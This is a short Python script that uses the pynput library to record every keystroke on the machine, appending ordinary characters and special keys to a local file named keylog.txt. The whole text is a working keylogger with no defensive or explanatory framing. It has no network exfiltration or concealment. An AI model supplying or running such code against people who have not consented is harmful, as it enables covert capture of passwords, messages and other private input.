from pynput import keyboard

# File to store the logged keystrokes
log_file = "keylog.txt"

# Function to handle key press
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

# Start listening to the keyboard
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()